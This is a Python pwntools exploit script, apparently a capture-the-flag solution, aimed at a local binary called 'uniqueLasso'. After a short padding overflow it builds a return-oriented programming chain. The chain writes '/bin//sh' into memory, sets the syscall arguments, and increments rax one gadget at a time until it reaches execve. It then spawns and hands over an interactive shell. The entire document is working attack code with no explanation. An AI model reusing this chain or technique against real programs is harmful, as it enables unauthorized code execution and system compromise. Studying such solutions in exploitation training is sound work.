from struct import pack
from pwn import *
# Padding goes here
r = process('./uniqueLasso')
gdb.attach(r)
p = ("A"*14)
p += p64(0x0000000000410b53) # pop rsi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x00000000004005af) # pop rax ; ret
p += '/bin//sh'
p += p64(0x000000000047f201) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000410b53) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x00000000004453d0) # xor rax, rax ; ret
p += p64(0x000000000047f201) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004006a6) # pop rdi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x0000000000410b53) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x000000000044a095) # pop rdx ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x00000000004453d0) # xor rax, rax ; ret
#p += p64(0x00000000004745c0) # mov rax, 7 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x0000000000474530) # add rax, 1 ; ret
p += p64(0x000000000040124c) # syscall


r.sendline(p)

r.interactive()
